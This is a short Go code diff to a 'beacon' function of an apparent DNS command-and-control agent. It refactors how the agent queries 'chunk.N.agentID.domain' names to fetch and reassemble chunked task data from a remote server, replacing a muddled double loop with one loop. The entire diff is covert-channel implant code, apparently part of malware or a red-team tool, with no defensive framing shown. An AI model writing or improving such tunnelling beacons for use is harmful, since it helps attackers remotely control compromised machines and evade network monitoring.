@@ -98,29 +98,14 @@ func (d *dnsTransport) beacon() ([]taskWire, error) {
 	var encoded string
 	if strings.HasPrefix(resp, "more:") {
 		total, _ := strconv.Atoi(strings.TrimPrefix(resp, "more:"))
-		var sb strings.Builder
-		sb.WriteString(resp) // first chunk is actually the total; first chunk of data is fetched below
-		// fetch first chunk (seq=0 is in the poll response? No: "more:N" means N chunks in buffer)
-		// fetch chunk 0..N-1
+		var parts []string
 		for seq := 0; seq < total; seq++ {
 			q := fmt.Sprintf("chunk.%d.%s.%s", seq, d.agentID, d.domain)
 			r, err := d.txQuery(q)
 			if err != nil {
 				return nil, err
 			}
-			if strings.HasPrefix(r, "chunk:") {
-				sb.Reset()
-				// Collect all chunks
-			}
-			_ = r
-		}
-		// simplified: reassemble inline
-		var parts []string
-		for seq := 0; seq < total; seq++ {
-			q := fmt.Sprintf("chunk.%d.%s.%s", seq, d.agentID, d.domain)
-			r, _ := d.txQuery(q)
-			r = strings.TrimPrefix(r, "chunk:")
-			parts = append(parts, r)
+			parts = append(parts, strings.TrimPrefix(r, "chunk:"))
 		}
 		encoded = strings.Join(parts, "")
 	} else {
